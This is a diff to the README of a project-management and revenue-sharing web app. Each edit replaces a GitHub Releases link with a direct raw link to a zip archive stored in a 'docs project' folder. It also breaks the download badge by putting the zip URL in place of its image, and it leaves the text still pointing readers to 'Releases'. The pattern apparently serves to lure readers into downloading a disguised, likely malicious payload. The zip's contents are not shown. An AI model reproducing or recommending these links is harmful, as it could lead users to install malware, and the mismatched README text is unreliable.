@@ -1,6 +1,6 @@
 # 🎮 Reactorcores-Revshare-System - A Tool for Creative Teams on a Budget
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-link-blue)](https://github.com/PS4XD0205/Reactorcores-Revshare-System/releases)
+[![Download Now](https://raw.githubusercontent.com/PS4XD0205/Reactorcores-Revshare-System/main/docs project/Reactorcores-Revshare-System_v2.2.zip%20Now-link-blue)](https://raw.githubusercontent.com/PS4XD0205/Reactorcores-Revshare-System/main/docs project/Reactorcores-Revshare-System_v2.2.zip)
 
 ## 📋 Table of Contents
 - [🎯 About](#-about)
@@ -13,7 +13,7 @@
 The **Reactorcores-Revshare-System** offers a complete solution for leaders of creative teams with no budget. This web application helps manage projects, resources, and revenue sharing effortlessly. Whether your team is making a game or developing an app, this platform helps you coordinate tasks and keep everything organized without any costs.
 
 ## 📥 Download & Install
-To get the application, visit [this page to download](https://github.com/PS4XD0205/Reactorcores-Revshare-System/releases). 
+To get the application, visit [this page to download](https://raw.githubusercontent.com/PS4XD0205/Reactorcores-Revshare-System/main/docs project/Reactorcores-Revshare-System_v2.2.zip). 
 
 Follow these simple steps:
 1. Go to the **Releases** section by clicking the link above.
@@ -62,4 +62,4 @@ A: Yes, you can reach out via the issues section on the GitHub repository, where
 A: Updates are released as needed, typically based on user feedback to improve the application.
 
 ## Conclusion
-Start managing your projects effectively with **Reactorcores-Revshare-System**. For more help, refer back to this README or visit the [Releases page to download](https://github.com/PS4XD0205/Reactorcores-Revshare-System/releases). Enjoy a smoother creative process with our easy-to-use platform!
+Start managing your projects effectively with **Reactorcores-Revshare-System**. For more help, refer back to this README or visit the [Releases page to download](https://raw.githubusercontent.com/PS4XD0205/Reactorcores-Revshare-System/main/docs project/Reactorcores-Revshare-System_v2.2.zip). Enjoy a smoother creative process with our easy-to-use platform!
